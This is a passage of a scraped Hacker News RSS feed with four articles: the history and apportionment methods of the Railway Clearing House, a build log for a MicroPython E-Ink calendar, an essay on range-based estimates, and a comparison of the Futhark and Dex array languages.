        <p>It is uncertain whether the credit for the idea of a central office to deal with the settlement of through accounts is due to <a href="http://en.wikipedia.org/wiki/George_Glyn,_1st_Baron_Wolverton">Mr. George Carr Glyn</a> (afterwards Lord Wolverton), chairman; to <a href="http://en.wikipedia.org/wiki/Robert_Stephenson">Mr. Robert Stephenson</a> (son of George Stephenson), engineer; to Mr. Kenneth Morison, chief of audit department, all of the <a href="https://en.wikipedia.org/wiki/London_and_Birmingham_Railway">London and Birmingham Railway</a>, or to <a href="http://en.wikipedia.org/wiki/James_Joseph_Allport">Sir James Allport</a> of the Midland Railway. Mr. Glyn, however, the banker, who was, of course, familiar with the methods of the historic Bankers’ Clearing House for the settlement of financial transactions, without doubt wholeheartedly supported the idea.</p>
        
        <p>The Railway Clearing House was accordingly established on January 2, 1842. From that date travelling facilities began to expand.</p>
        
        <p>A staff of four men formed the nucleus of the Clearing House, which was situated in Drummond Street, opposite the present main entrance to Euston Station, a London terminus of the LMS. Business was carried on at Drummond Street until 1848, when the first block of the present building in Seymour Street, Euston Square, was built.</p>
        
        <p>The first secretary of the Clearing House was Mr. Kenneth Morison. Nine railway companies were admitted to participate in the business. They were the London and Birmingham, Midland Counties, Birmingham and Derby Junction, North Midland, Hull and Selby, Manchester and Leeds, Leeds and Selby, York and North Midland, and Great North of England. These companies have long since been merged in the constituent companies of the LMS or LNER.</p>
        
        <p><img alt="Old documents in the muniment room of the Railway Clearing House" title="Old documents in the muniment room of the Railway Clearing House" src="https://www.railwaywondersoftheworld.com/wpimages/wpa5fb7576_05_06.jpg" id="pic_1235"></p>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        <p>OLD DOCUMENTS are stored in the muniment room of the Railway Clearing House, seen in the above picture. The Railway Clearing House is divided into three main departments -<wbr> the Secretarial, the Merchandise, and the Coaching sections.</p>
        
        
        
        <p>The traffic receipts handled by the original Clearing House were those for the through conveyance of goods, passengers, parcels and live stock between London and Darlington in one direction and between Manchester and Hull in the other.</p>
        
        <p>The railways included in the RCH system had increased by 1845 to sixteen, with 656 route-<wbr>miles of track. The difficulties of obtaining cash settlement between the railway companies and the clearing house, led in 1850 to the passing of an <a href="http://www.railwaysarchive.co.uk/documents/HMG_Act_Clear1850.pdf">Act of Parliament</a> conferring on the RCH the right to sue in the courts. This ended the trouble and the companies subsequently settled all payments promptly.</p>
        
        <p>The Railway Clearing House was Incorporated by Act of Parliament in 1897. From its beginning it had been under the control of a Committee consisting of one delegate from each of the companies under the system. Changes were made, however, under the Railway Clearing House Amalgamation Scheme of 1922.</p>
        
        <p>The corporation now consists of four delegates from each of the four great amalgamated companies and one from each of the other companies, namely the London Passenger Transport Board, Mersey Railway, the lines of the Joint Committees, and the Irish Companies. An executive or “Superintending Committee” of eight members is elected from the delegates of the corporation.</p>
        
        <p>The number of companies working under the RCH system to-<wbr>day is fifteen, with a total route length of 23,000 miles -<wbr> a figure in striking contrast to the 656 miles of 1845. The receipts of the Clearing House for 1842 were £193,246; for 1933 the amount involved was over £34,000,000, an equally striking comparison.</p>
        
        <p>The work of the Railway Clearing House is divided into three Departments -<wbr> Merchandise, Coaching, and Secretarial.</p>
        
        <p>The Merchandise Department apportions the receipts from the carriage of goods, minerals, and livestock. Coal traffic was formerly settled through the Clearing House, but adjustments are now made by the originating Company, which collects the charges and pays out the other companies' proportions.</p>
        
        <p>The first function of the Railway Clearing System is to ensure that charges in which two or more companies are concerned are correctly accounted for at both terminal stations, from which the respective agents send information each month to the Clearing House. Any differences between the two sets of accounts are then settled by correspondence through the Audit offices.</p>
        
        <p>Perhaps the best means of understanding the system will be to consider, for example, a consignment of goods from Bristol (LMS) to Southampton (Southern) via The Somerset and Dorset Joint (between Bath and Templecombe).</p>
        
        <p>We will assume that the load weighs 10 tons and the charge is £10, of which half is “paid” at Bristol and the other half “to be paid” at Southampton. On making a settlement there are three companies to share in the receipt of £10 -<wbr> the LMS (Bristol to Bath), the Somerset and Dorset Joint (Bath to Templecombe), and the Southern Railway (Templecombe to Southampton).</p>
        
        <p>The first adjustment to be made on the accounts is that relative to what are known as “terminal services”, such as collection and delivery charges. The balance of the total charges is usually divided on a mileage basis, according to the distance the load is carried over each of the railways. There are, however, a number of exceptions to this principle, such as agreed apportionments, fixed tolls on tonnage, and other special methods of division.</p>
        
        <p>The above example might be clearly expressed by the following tabulation:</p>
        
        
        
        
        
        
        
        
        
        
        <p>This leaves a residue from £10 of £7 13s 4d, which is divided on a mileage basis, taking the total distance at 100 miles -<wbr> 10 miles on the LMS, 30 miles on the Somerset and Dorset Joint, and 60 miles on the Southern Railway.</p>
        
        <p>The apportionment of the £7 13s 4d would then be as follows:</p>
        
        
        
        
        
        
        
        
        
        
        
        <p>The final balance payable to each company would thus be:</p>
        
        
        
        
        
        
        
        
        
        
        
        
        <p>If there had been traffic in the reverse direction, the two entries would have been combined in one settlement to cover both “up” and “down” traffic.</p>
        
        <p>To minimize the clerical work involved, it is now the practice to limit individual division to the larger monthly sums, and to make a bulk settlement of the smaller monthly amounts. In practice, the larger amounts are not divided in detail until the close of the half years ended June and December. Each month “interim” accounts are brought out and payments made “on account” to the companies concerned, subject to adjustment at the half-<wbr>yearly settlement.</p>
        
        <p>Excursion Traffic</p>
        
        <p>The bulk settlement of small amounts is made on a basis of total receipts per pair of companies, irrespective of route. After a percentage deduction for terminal charges, the remainder is divided half-<wbr>yearly, on an agreed formula. This is done to avoid many separate calculations. Since in each half year there are as many as three million transactions, three-<wbr>fourths of are which “small”, the saving of work will be obvious.</p>
        
        <p>Passenger traffic is dealt with through the Railway Clearing House on different lines, and is divided by its Coaching …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.railwaywondersoftheworld.com/clearing-house.html">https://www.railwaywondersoftheworld.com/clearing-house.html</a></em></p>]]>
            </description>
            <link>https://www.railwaywondersoftheworld.com/clearing-house.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560849</guid>
            <pubDate>Mon, 28 Dec 2020 17:05:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Building an E-Ink Calendar and a UI Toolkit along the way]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25560570">thread link</a>) | @rahulrav
<br/>
December 28, 2020 | https://rahulrav.com/blog/e_ink_dashboard.html | <a href="https://web.archive.org/web/*/https://rahulrav.com/blog/e_ink_dashboard.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <main>
            <div>
              <div>
                <p>December 27 2020, Monday</p>
<h3 id="building-an-e-ink-calendar-and-a-ui-toolkit-along-the-way">Building an E-Ink Calendar, and a UI Toolkit along the way</h3>
<p>Having worked from home for the better part of the year, I recently started to work on a new project. Building a E-Ink based dashboard which would keep track of my meetings among other things. Given the always-on nature of the E-Ink display, this would help me better manage by schedule during a typical work-day especially given I tend to miss Google Calendar notifications <em>a lot</em>. </p>
<p>This is what the end result looks like:</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_end_result.jpg" alt="Top View" title="E-Ink Dashboard" width="640px">
</p>
<p>The app here is showing the next 5 Calendar events for <strong>a demo Google account</strong>.<br>
Looks nice and simple, does it not ?</p>
<h4 id="the-hardware">The Hardware</h4>
<p>I took an off-the-shelf approach for the hardware. I purchased an <a href="https://inkplate.io/">InkPlate 6</a> which was originally crowd-funded on <a href="https://www.crowdsupply.com/e-radionica/inkplate-6">CrowdSupply</a>.</p>
<p>The E-Ink display is from a recycled Kindle e-reader, which means its a pretty great display. It has 2 modes including a 2-bit per pixel gray-scale mode and monochrome. It supports partial updates in monochrome mode. The display is connected to a <code>ESP 32</code>, with built-in WiFi. All we need to do is to hookup the display to a PC via a USB cable and power it on. The display also comes with a nice 3D printed enclosure. </p>
<h4 id="the-software">The Software</h4>
<p>The InkPlate 6 supports MicroPython, and recently the libraries powering the display were <a href="https://github.com/e-radionicacom/Inkplate-6-micropython">opensourced</a>. This gave me a decent foundation to build on top-of.</p>
<h5 id="oauth2-support">OAuth2 support</h5>
<p>The first step to showing events from Google Calendar is to be able to complete an <code>OAuth2</code> flow. I decided to use the <a href="https://developers.google.com/identity/protocols/oauth2/limited-input-device">device flow</a> given the limited input capabilities of the ESP 32. </p>
<p>MicroPython does not have any libraries that work with <code>OAuth2</code>, so I decided to write one. Here is the <a href="https://github.com/micropython/micropython-lib/pull/407">PR</a> that I eventually made to the <a href="https://github.com/micropython/micropython-lib">micropython-lib</a> GitHub repo which adds support for this specification. This ended up being pretty straightforward, given my familiarity with OAuth2 (having authored <a href="https://github.com/openid/AppAuth-JS">this</a> library before).</p>
<h5 id="building-a-limited-ui-toolkit">Building a limited UI-Toolkit</h5>
<p>The <code>InkPlate</code> has a decent <a href="https://github.com/e-radionicacom/Inkplate-6-micropython/blob/master/gfx.py">Graphics</a> API, but rather than having to hard-code coordinates to render UI i decided to take minor detour and build a mini UI Toolkit from first principles based on the graphics primitives that were supported. I took a lot of inspiration from the <em>existing</em> Android UI View system and build a small subset of those APIs.</p>
<h6 id="measuring-text">Measuring text</h6>
<p>The first step was to be able to measure the text to be able to compute how much space <code>text</code> with a given <code>text size</code> would occupy on the screen. The <code>InkPlate</code> uses bitmap fonts, so i ended up using a look-up-table for widths and heights for individual letters for a given size. It's an approximation, but it worked well enough for me to proceed to the next step.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_1.jpg" alt="Top View" title="Step 1: Measuring text" width="640px">
</p>
<h6 id="columns-alignment-and-padding">Columns, Alignment and Padding</h6>
<p>Now that I had text measurements I could start drawing some text in <code>Columns</code> and <code>Rows</code> (these are the containers supported by the  custom layout system). I managed to also implement <code>padding</code> and text <code>alignments</code>. Not perfect, but still pretty good progress. </p>
<p>The image below consists of a single <code>Column</code> with a nested <code>Row</code> and a bunch of <code>Text</code> nodes in various alignments and sizes. The <code>10px</code> box on top is a component called <code>Spacer</code> which just occupies empty space on the screen.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_2.jpg" alt="Top View" title="Step 2: Columns, Padding &amp; Alignments" width="640px">
</p>
<h6 id="columnar-layouts-and-alignments">Columnar Layouts and alignments</h6>
<p>Now that I had some basic building blocks, I decided to go further and implement more complex layouts. I implemented support for <code>aligning</code> containers and fixed a lot of bugs when nesting containers. You can also see <code>text alignments</code> within individual <code>Column</code> containers working.</p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_3.jpg" alt="Top View" title="Step 3: Columnar Layouts &amp; Nested Containers" width="640px">
</p>
<h6 id="supporting-images">Supporting Images</h6>
<p>I finally added support for <code>Image</code> nodes to layouts. This is also when I started to add some much needed UI polish. </p>
<p>
  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>
              </div>
            </div>
            
          </main>
          
          
          
        </div></div>]]>
            </description>
            <link>https://rahulrav.com/blog/e_ink_dashboard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560570</guid>
            <pubDate>Mon, 28 Dec 2020 16:38:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Accurate Estimations]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25560386">thread link</a>) | @1penny42cents
<br/>
December 28, 2020 | https://camhashemi.com/2020/12/28/accurate-estimations/ | <a href="https://web.archive.org/web/*/https://camhashemi.com/2020/12/28/accurate-estimations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-269">
			<!-- .entry-header -->
		<div>
		
<p>We’re constantly asked to give estimates:</p>



<p><em>How long will it take?<br>How much will it cost?</em><br><em>What time should we leave?</em><br><em>How much do you want?</em></p>



<p>Estimations are information about the unknown. We constantly use this information to make decisions: allocating resources, changing strategies, and choosing partners. But despite all this practice, we’re horrible at accurate estimations.</p>



<h2>Why Estimations are Hard</h2>



<p>Estimations are hard for both technical and social reasons.</p>



<p>We don’t know what we don’t know. Naive estimators fail to account for surprises. They estimate based on known factors and best-case scenarios. These estimates may be <em>perfectly accurate</em> beforehand, but they’re instantly broken by the first surprise.</p>



<p>Experienced estimators account for this problem by ‘adding some buffer’. But even then, how much should they add? Even knowing that surprises <em>can</em> happen, it’s impossible to <em>how many</em> will happen or <em>the impact</em> of those surprises. Choosing the right amount of buffer is a lot like making the right estimation in the first place. We still don’t know what we don’t know. And adding too much buffer can be as expensive as failing to account for surprise at all.</p>



<p>In addition to this technical problem, there’s a strong social problem. Let’s imagine two common scenarios.</p>



<p>In the first scenario, you just gave  giving an estimate to your team. You perfectly estimate that a project will take three weeks; but your manager gives you a puzzled look. Your teammate snickers, claiming they could do it in a week, tops. The feeling is that you must be either lazy or incompetent to give such a padded estimation. You newly shortened estimate is wrong, so you go on to extend the project’s deadline twice in three weeks. Rather than holding you accountable to that one-week estimate, your manager commends you for being able to handle the unforeseen surprises on such a complicated project.</p>



<p>In the other scenario, you’re giving an estimate to a potential client. You perfectly estimate that a project will take three weeks; but your competitor only estimates it’ll take a week. The client signs with your competitor. Since their estimate was wrong, your competitor goes on to extend the deadline twice in three weeks. Even though your estimate was accurate, your client’s estimate got them paid.</p>



<p>I’ve been in countless scenarios like this. Sometimes people outright pressure us into shortening our estimations, and sometimes the voice in our heads push us to. Either way, giving accurate estimates is both technically hard and socially challenging [1].</p>



<h2>Two Types of Estimators</h2>



<p>In response to this hard problem, we become systematic underestimators or systematic overestimators.</p>



<p>Underestimators fail to give enough buffer. This strategy has two key benefits. First, it signals (unrealistically) high performance. Like our virtue-signalling teammate, we can underestimate ahead of time, then point at concrete surprises for our eventual underperformance. And like our overpromising competitor, we can underestimate during a bid and do whatever we want after the contract is signed. Second, tight estimates demand efficiency. Underestimators set deadlines that they and their teams must work hard to meet. Underestimation works well when the costs of going over-budget are small. But when those costs are large, underestimations lead to disasters. On the whole, underestimators systematically run the risk of being burnt out, past-deadline, and over-budget.</p>



<p>Overestimators are instead biased towards large buffers. Extreme overestimators might send you articles titled “Estimations are a Scam”, or claim that estimations are simply tools for worker exploitation. Overestimation works when the costs of buffer are low and the costs of going over budget are high. But overestimators are constantly taxed by Parkinson’s Law. Parkinson’s Law is the pattern where projects fill the time and resources they’re allocated, instead of the time and resources they need [2]. Rather than pushing towards peak performance, overestimators systematically move at a bored, leisurely pace. Overestimators are also demotivating. Rather than inspiring the team to reach competitive goals, they disparage those who do. So while underestimators run the risk of their teams burning out, overestimators run the risk of their teams shutting down.</p>



<p>To simplify the hard problem of estimations, we slowly become under- or over-estimators. We reap the systematic rewards and accept the systematic costs. These chosen strategies may work in many contexts. But for any simple strategy, there are worst-case scenarios where those systematic risks blow up. Underestimators blow up when the costs of going over budget skyrocket. Overestimators blow up when the costs of adding extra buffer skyrocket.</p>



<p>This line between underestimators and overestimators forms a classic “spectrum problem”. A spectrum problem occurs when we oversimplify the solution to a given tradeoff. In this case, we’re splitting the spectrum of estimation strategies in half. Underestimators fall on one side of the line, and overestimators fall on the other. With many spectrum problems, the better solution is to cut the spectrum into three pieces, choosing the middle strategy between extremes. In doing so, we acknowledge the costs and rewards of both sides, maximizing the upsides and minimizing the downsides systematically.</p>



<h2>Playing Single-Pointed Darts</h2>



<p>Imagine a game of darts with very simple rules. I throw my dart first, and you only score by hitting that same exact dart-sized point. This game is very simple, but so difficult that nobody would play it. To make darts playable, we specify scoring <em>ranges</em>. These same ranges are missing from our everyday estimations.</p>



<p>The most common estimate sounds something like: “I’ll have it ready by 5pm.” But this is just like playing single-point darts! Imagine that this estimate is perfectly precise: the project can’t be ready one second before or one second after 5pm. While impressive, there’s zero room for error. If we end up sick, or if the project ends up more complex than expected, our estimate becomes instantly wrong.</p>



<p>To account for surprises, we can add buffer. But adding buffer only shifts the dart board over a few inches. “I’ll have it ready by 5pm <em>tomorrow</em>” faces all the same problems as the first estimation. Two days of surprises still makes me wrong. We’re still playing single-pointed darts.</p>



<p>It’s a losing game. And yet we see it played again and again, day after day, project after project.</p>



<h2>Playing Darts with Ranges</h2>



<p>To enjoy this game of darts, we need to change the rules. Rather than giving a single-pointed estimate, we give two points: one for the best case, and one for the worst case. These two points create a range of targets to hit, just like the game of darts we know and love.</p>



<p>To demonstrate, I can give an example from my personal life. My girlfriend is very punctual, and I’m not. She’s a classic overestimator, giving as much buffer as we can afford. And I’m a classic underestimator, giving the most optimistic estimates. So whenever we have somewhere to be, and she asks me “what time should we be ready?”… it’s a classic estimation problem!</p>



<p>My preference would be to underestimate, and tell her the last minute we can leave without being late. Her preference would be for me to overestimate, telling her the soonest we can leave without being “too early”. But no matter what I say, we face all of the same problems stated above.</p>



<p>Recently, I’ve started giving her two answers. The first answer is “the green time”. <strong>The green time tells us when we should leave so that we’re pleasantly early</strong>. The second answer is “the red time”. <strong>The red time is the last minute we can leave, without definitely being late</strong>. If we can be ready by the green time without stress or shortcuts, that’s perfect. Once we pass the green time, we go into the “yellow zone.” <strong>The yellow zone is the buffer between early and late</strong>. There’s no need to take shortcuts or change plans yet, but we’re getting close. Once we approach the red line, we start discussing the need to take shortcuts, or to start telling others that we may be a little late.</p>



<p>Having a green time, a yellow zone, and a red time transforms our game of single-pointed darts into a proper dartboard, with zones of success. The green time makes my girlfriend happy: she can be ready early without worry. The red time makes me happy: I can fill my buffer time up with other activities. And the yellow zone is a signal for both of us to get focused or to start taking shortcuts [3].</p>



<p>Aside from the technical benefits, I can <em>feel</em> the difference in enjoyment between playing single-pointed darts vs playing scoring-ranged darts. Having a range makes inherent uncertainty explicit to the group. Adding buffer doesn’t just shift the dartboard a few inches, it expands our range of accuracy. Larger buffers signal more uncertainty and require less precision, while smaller buffers signal more confidence and require more precision. The expression of certainty and confidence isn’t possible to communicate with a single-pointed estimate.</p>



<p>By estimating with two numbers instead of one, a richness of information and strategies are made available.</p>



<h2>Simple Changes</h2>



<p>Using two numbers instead of one, these so-called “confidence intervals” aren’t complicated. Then why are they so absent from everyday life?</p>



<p>Although nothing prevented us from discovering them earlier, the first mention of confidence intervals in scientific literature wasn’t until 1937. And it wasn’t until the 1980s that they were required in scientific journals. So if it took forty years for the most knowledgeable people to apply a simple solution towards the most urgent problems, it’s not surprising that it’s taken the rest of us at least as long. That said, the goal of this essay is to speed up that process.</p>



<p>We can move towards accurate estimations by practicing two …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camhashemi.com/2020/12/28/accurate-estimations/">https://camhashemi.com/2020/12/28/accurate-estimations/</a></em></p>]]>
            </description>
            <link>https://camhashemi.com/2020/12/28/accurate-estimations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560386</guid>
            <pubDate>Mon, 28 Dec 2020 16:19:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Comparison of Futhark and Dex]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25559967">thread link</a>) | @Athas
<br/>
December 28, 2020 | https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html | <a href="https://web.archive.org/web/*/https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      

<p>
    Posted on December 28, 2020
    
        by Troels Henriksen
    
</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I’m not a Dex expert, so maybe I’ve missed a thing here or there.</p>
<p>Futhark wasn’t originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it’s fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex’s authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L₁ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we’d write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex’s approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you’d actually write this program in Futhark. Instead you’d first define a function for computing the L₁ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you’d apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it’s an interesting contrast that I think is due to the two language’s different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a “traditional” combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L₁ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it’s still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I’m not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex’s index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)
   xsCov</code></pre>
<p>In Futhark we write it as:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>let</span> covariance0 [n] (xs:[n]f64) (xsm:f64) (ys:[n]f64) (ysm:f64) =</span>
<span id="cb7-2">  f64.sum (map2 (\x y -&gt; (x-xsm) * (y-ysm)) xs ys) / f64.i64 (n<span>-1</span>)</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>let</span> covariance [n][d] (xs:[n][d]f64) =</span>
<span id="cb7-5">  <span>let</span> xsT = transpose xs</span>
<span id="cb7-6">  <span>let</span> means = map mean xsT</span>
<span id="cb7-7">  <span>in</span> map2 (\a a_mean -&gt;</span>
<span id="cb7-8">             map2 (\b b_mean -&gt; covariance0 a a_mean b b_mean)</span>
<span id="cb7-9">                  xsT means)</span>
<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It’s certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn’t yet find a Dex example where the effect system was more than a small notational convenience. I’m sure there’s one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn’t figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It’s really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
